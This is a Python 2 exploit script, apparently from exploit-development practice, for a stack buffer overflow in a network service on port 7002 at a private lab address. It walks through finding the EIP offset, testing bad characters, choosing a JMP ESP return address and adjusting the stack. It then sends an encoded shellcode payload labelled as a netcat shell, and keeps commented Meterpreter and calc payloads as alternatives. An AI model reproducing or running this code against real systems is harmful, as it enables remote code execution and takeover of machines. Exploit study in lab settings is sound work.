#!/usr/bin/python
import socket


def payload1():
    return "A" * 0x830

def pattern():
    # msf-pattern_create -l 2096 (0x830)
    return 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr'
    # result 72433372
    # msf-pattern_offset -l 2096 -q 72433372
    # [*] Exact match at offset 2080
    # offset in debugger map 0x820 -> 2080

def check_eip():

    buffer_size_till_epi = 2080
    space_for_shell_before_eip = 400

    EAX = "X" * 4
    shell = "D" * 389

    filler = "A" * (buffer_size_till_epi - space_for_shell_before_eip - len(EAX))

    space_after_shell_before_eip = "A" * (buffer_size_till_epi - len(filler) - len(shell) - len(EAX))
    print("Space after shell: " + str(len(space_after_shell_before_eip)))

    eip = "B" * 4
    offset = "C" * 15

    return EAX + filler + shell + space_after_shell_before_eip + eip + offset


def bad_chars():
    badchars = (

                # "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
                # "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
                # "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
                # "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3c\x3d\x3e\x3f\x40"
                # "\x41\x42\x43\x44\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
                # "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
                # "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
                # "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
                # "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
                # "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
                # "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
                # "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
                # "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
                # "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
                # "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
                "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"


    )

    buffer_size_till_epi = 2080
    space_for_shell_before_eip = 400
    shell = "D" * 350

    filler = "A" * (buffer_size_till_epi - space_for_shell_before_eip)

    space_after_shell_before_eip = "A" * (buffer_size_till_epi - len(filler) - len(shell))
    print("Space after shell: " + str(len(space_after_shell_before_eip)))

    return filler + shell + space_after_shell_before_eip + badchars


def get_shell():

    # return "B" * 351

    # NETCAT THREAD 4444
    return (
        "\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
        "\x94\x52\x7b\x99\x83\xee\xfc\xe2\xf4\x68\xba\xf9\x99\x94\x52"
        "\x1b\x10\x71\x63\xbb\xfd\x1f\x02\x4b\x12\xc6\x5e\xf0\xcb\x80"
        "\xd9\x09\xb1\x9b\xe5\x31\xbf\xa5\xad\xd7\xa5\xf5\x2e\x79\xb5"
        "\xb4\x93\xb4\x94\x95\x95\x99\x6b\xc6\x05\xf0\xcb\x84\xd9\x31"
        "\xa5\x1f\x1e\x6a\xe1\x77\x1a\x7a\x48\xc5\xd9\x22\xb9\x95\x81"
        "\xf0\xd0\x8c\xb1\x41\xd0\x1f\x66\xf0\x98\x42\x63\x84\x35\x55"
        "\x9d\x76\x98\x53\x6a\x9b\xec\x62\x51\x06\x61\xaf\x2f\x5f\xec"
        "\x70\x0a\xf0\xc1\xb0\x53\xa8\xff\x1f\x5e\x30\x12\xcc\x4e\x7a"
        "\x4a\x1f\x56\xf0\x98\x44\xdb\x3f\xbd\xb0\x09\x20\xf8\xcd\x08"
        "\x2a\x66\x74\x0d\x24\xc3\x1f\x40\x90\x14\xc9\x3a\x48\xab\x94"
        "\x52\x13\xee\xe7\x60\x24\xcd\xfc\x1e\x0c\xbf\x93\xad\xae\x21"
        "\x04\x53\x7b\x99\xbd\x96\x2f\xc9\xfc\x7b\xfb\xf2\x94\xad\xae"
        "\xc9\xc4\x02\x2b\xd9\xc4\x12\x2b\xf1\x7e\x5d\xa4\x79\x6b\x87"
        "\xec\xf3\x91\x3a\xbb\x31\x26\x1c\x13\x9b\x94\x43\x27\x10\x72"
        "\x38\x6b\xcf\xc3\x3a\xe2\x3c\xe0\x33\x84\x4c\x11\x92\x0f\x95"
        "\x6b\x1c\x73\xec\x78\x3a\x8b\x2c\x36\x04\x84\x4c\xfc\x31\x16"
        "\xfd\x94\xdb\x98\xce\xc3\x05\x4a\x6f\xfe\x40\x22\xcf\x76\xaf"
        "\x1d\x5e\xd0\x76\x47\x98\x95\xdf\x3f\xbd\x84\x94\x7b\xdd\xc0"
        "\x02\x2d\xcf\xc2\x14\x2d\xd7\xc2\x04\x28\xcf\xfc\x2b\xb7\xa6"
        "\x12\xad\xae\x10\x74\x1c\x2d\xdf\x6b\x62\x13\x91\x13\x4f\x1b"
        "\x66\x41\xe9\x9b\x84\xbe\x58\x13\x3f\x01\xef\xe6\x66\x41\x6e"
        "\x7d\xe5\x9e\xd2\x80\x79\xe1\x57\xc0\xde\x87\x20\x14\xf3\x94"
        "\x01\x84\x4c"
    )

    #METERPRETER THREAD 4444
    # return (
    #     "\xdb\xda\xd9\x74\x24\xf4\x5a\xbe\x8e\xc6\x6f\x9f\x33\xc9\xb1"
    #     "\x5b\x31\x72\x19\x03\x72\x19\x83\xc2\x04\x6c\x33\x93\x77\xf2"
    #     "\xbc\x6c\x88\x92\x35\x89\xb9\x92\x22\xd9\xea\x22\x20\x8f\x06"
    #     "\xc9\x64\x24\x9c\xbf\xa0\x4b\x15\x75\x97\x62\xa6\x25\xeb\xe5"
    #     "\x24\x37\x38\xc6\x15\xf8\x4d\x07\x51\xe4\xbc\x55\x0a\x63\x12"
    #     "\x4a\x3f\x39\xaf\xe1\x73\xac\xb7\x16\xc3\xcf\x96\x88\x5f\x96"
    #     "\x38\x2a\xb3\xa3\x70\x34\xd0\x89\xcb\xcf\x22\x66\xca\x19\x7b"
    #     "\x87\x61\x64\xb3\x7a\x7b\xa0\x74\x64\x0e\xd8\x86\x19\x09\x1f"
    #     "\xf4\xc5\x9c\x84\x5e\x8e\x07\x61\x5e\x43\xd1\xe2\x6c\x28\x95"
    #     "\xad\x70\xaf\x7a\xc6\x8d\x24\x7d\x09\x04\x7e\x5a\x8d\x4c\x25"
    #     "\xc3\x94\x28\x88\xfc\xc7\x92\x75\x59\x83\x3f\x62\xd0\xce\x57"
    #     "\x47\xd9\xf0\xa7\xcf\x6a\x82\x95\x50\xc1\x0c\x96\x19\xcf\xcb"
    #     "\xaf\x0d\xf0\x04\x17\x5d\x0e\xa5\x68\x74\xd5\xf1\x38\xee\xfc"
    #     "\x79\xd3\xee\x01\xac\x4e\xe4\x95\x8f\x27\x4a\x2b\x78\x3a\xaa"
    #     "\xa5\x24\xb3\x4c\x95\x84\x93\xc0\x56\x75\x54\xb0\x3e\x9f\x5b"
    #     "\xef\x5f\xa0\xb1\x98\xca\x4f\x6c\xf1\x62\xe9\x35\x89\x13\xf6"
    #     "\xe3\xf4\x14\x7c\x06\x09\xda\x75\x63\x19\x0b\xe2\x8b\xe1\xcc"
    #     "\x87\x8b\x8b\xc8\x01\xdb\x23\xd3\x74\x2b\xec\x2c\x53\x2f\xea"
    #     "\xd3\x22\x06\x81\xe2\xb0\x26\xfd\x0a\x55\xa7\xfd\x5c\x3f\xa7"
    #     "\x95\x38\x1b\xf4\x80\x46\xb6\x68\x19\xd3\x39\xd9\xce\x74\x52"
    #     "\xe7\x29\xb2\xfd\x18\x1c\xc0\xfa\xe7\xe3\xef\xa2\x8f\x1b\xb0"
    #     "\x52\x50\x71\x30\x03\x38\x8e\x1f\xac\x88\x6f\x8a\xe5\x80\xfa"
    #     "\x5b\x47\x30\xfb\x71\x09\xec\xfc\x76\x92\x1f\x87\xf7\x25\xe0"
    #     "\x78\x1e\x42\xe0\x79\x1e\x74\xdc\xac\x27\x02\x23\x6d\x1c\x0d"
    #     "\xbe\x5b\x69\xa6\x67\x0e\xd0\xab\x97\xe5\x17\xd2\x1b\x0f\xe8"
    #     "\x21\x03\x7a\xed\x6e\x83\x97\x9f\xff\x66\x97\x0c\xff\xa2"
    # )

    # CALC
    # return (
    #     "\xd9\xeb\xd9\x74\x24\xf4\xba\xaa\x92\x22\x0e\x5d\x2b\xc9\xb1"
    #     "\x31\x31\x55\x18\x03\x55\x18\x83\xed\x56\x70\xd7\xf2\x4e\xf7"
    #     "\x18\x0b\x8e\x98\x91\xee\xbf\x98\xc6\x7b\xef\x28\x8c\x2e\x03"
    #     "\xc2\xc0\xda\x90\xa6\xcc\xed\x11\x0c\x2b\xc3\xa2\x3d\x0f\x42"
    #     "\x20\x3c\x5c\xa4\x19\x8f\x91\xa5\x5e\xf2\x58\xf7\x37\x78\xce"
    #     "\xe8\x3c\x34\xd3\x83\x0e\xd8\x53\x77\xc6\xdb\x72\x26\x5d\x82"
    #     "\x54\xc8\xb2\xbe\xdc\xd2\xd7\xfb\x97\x69\x23\x77\x26\xb8\x7a"
    #     "\x78\x85\x85\xb3\x8b\xd7\xc2\x73\x74\xa2\x3a\x80\x09\xb5\xf8"
    #     "\xfb\xd5\x30\x1b\x5b\x9d\xe3\xc7\x5a\x72\x75\x83\x50\x3f\xf1"
    #     "\xcb\x74\xbe\xd6\x67\x80\x4b\xd9\xa7\x01\x0f\xfe\x63\x4a\xcb"
    #     "\x9f\x32\x36\xba\xa0\x25\x99\x63\x05\x2d\x37\x77\x34\x6c\x5d"
    #     "\x86\xca\x0a\x13\x88\xd4\x14\x03\xe1\xe5\x9f\xcc\x76\xfa\x75"
    #     "\xa9\x89\xb0\xd4\x9b\x01\x1d\x8d\x9e\x4f\x9e\x7b\xdc\x69\x1d"
    #     "\x8e\x9c\x8d\x3d\xfb\x99\xca\xf9\x17\xd3\x43\x6c\x18\x40\x63"
    #     "\xa5\x7b\x07\xf7\x25\x52\xa2\x7f\xcf\xaa"
    # )


def jmp_esp_to_shell():

    # 0x1480113D
    epi = "\x3d\x11\x80\x14"

    # Negative we move offset down in the stacks
    offset = -3

    buffer_size_till_eip = 2080

    buffer_size_from_eip_to_esp = 4

    total_size_in_esp = 12

    total_available_jumps_in_esp_space = total_size_in_esp / 4
    assert(isinstance(total_available_jumps_in_esp_space, int))

    shell_size = len(get_shell())

    shell_initial_size = shell_size # + 8

    total_shift_from_esp = shell_initial_size + buffer_size_from_eip_to_esp

    while ( total_shift_from_esp % total_available_jumps_in_esp_space != 0 ):
        total_shift_from_esp = total_shift_from_esp + 1


    nops = "\x90" * 0

    move_esp_decoder = "\x83\xEC\x10" * 1


    shell_filler_after_shell = "A" * (shell_initial_size - shell_size - offset - len(move_esp_decoder) - len(nops) )

    shell_filler_before_shell = "A" * (buffer_size_till_eip - shell_initial_size + offset + len(move_esp_decoder) + len(nops))


    buffer_before_eip = shell_filler_before_shell + get_shell() + shell_filler_after_shell





    # We just have 12 bits after EPI
    # "\xFF\xE4" # jmp esp => use 2 positions...
    # we need subtraction commands within 10 positions to move ESP to Shell Code

    # Hex Shell size is 360, lets move 378 from eip addr to our shell
    # 378 / 3 = 126 == len 9 in Hex => OK => \x83\xEC\x73\x83\xEC\x73\x83\xEC\x73

    # converter: https://defuse.ca/online-x86-assembler.htm#disassembly

    print("BUFFER SIZE BEFORE PAYLOAD: " + str(len(shell_filler_before_shell)))
    print("BUFFER SIZE SHELL: " + str(shell_size))
    print("BUFFER SIZE AFTER PAYLOAD: " + str(len(shell_filler_after_shell)))
    print("BUFFER SIZE BEFORE EIP: " + str(len(buffer_before_eip)))
    print("TOTAL AVAILABLE CMDs AT ESP: " + str(total_available_jumps_in_esp_space))
    print("TOTAL SHIFT SHELL FROM ESP: " + str(total_shift_from_esp))


    jump_size = total_shift_from_esp / total_available_jumps_in_esp_space

    print("SHIFT STEEP NEEDED: " + str(jump_size))

    assert (len(buffer_before_eip) == buffer_size_till_eip)
    assert (isinstance(jump_size, int))
    assert(total_shift_from_esp/total_available_jumps_in_esp_space == jump_size)


    # jump1 = str()
    # for x in range(0, total_available_jumps_in_esp_space):
    #     jump1 += ("\x83\xEC" + hex(jump_size)) # sub esp,xxx
    #
    # jump1 += ("\xFF\xE4") # jmp esp
    #

    jump1 = (
        "\x83\xEC\x7f" # sub esp,0x7f ; 127
        "\x83\xEC\x7f" # sub esp,0x7f ; 127
        "\x83\xEC\x7f" # sub esp,0x7f ; 127
            "\xFF\xE4" # jmp esp
    )

    # jump1 = (
    #     "\x81\xEC\x89\x01\x00\x00\xFF\xE4"
    # )

    return buffer_before_eip + epi + jump1


def shell2():

    buffer_size_till_epi = 2080
    space_for_shell_before_eip = 400

    HEAD = "\x90" * 20
    # shell = "D" * 389
    shell = get_shell()

    filler = "A" * (buffer_size_till_epi - space_for_shell_before_eip - len(HEAD)) * 0

    space_after_shell_before_eip = "A" * (buffer_size_till_epi - len(filler) - len(shell) - len(HEAD))
    print("Space after shell: " + str(len(space_after_shell_before_eip)))

    eip = "\x3d\x11\x80\x14"
    instrucctions = (
        "\x29\xD4" # sub esp,edx
        #"\x29\xC4" # sub esp,eax
        "\x83\xC4\x10" # add esp,0x04
        "\xFF\xE4" # jmp esp
    )

    return HEAD + filler + shell + space_after_shell_before_eip + eip + instrucctions

if __name__ == '__main__':
    try:
        print "\nSending evil buffer..."

        # buffer = payload1()
        # buffer = pattern()
        # buffer = check_eip()
        # buffer = bad_chars()
        # buffer = jmp_esp_to_shell()
        buffer = shell2()



        print("TOTAL BUFFER SIZE: " + str(len(buffer)))
        print(buffer)


        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.connect(("192.168.178.79", 7002))
        s.send(buffer)

        s.close()

        print "\nDone!"

    except Exception as e:
        print "\nCould not connect: " + str(e)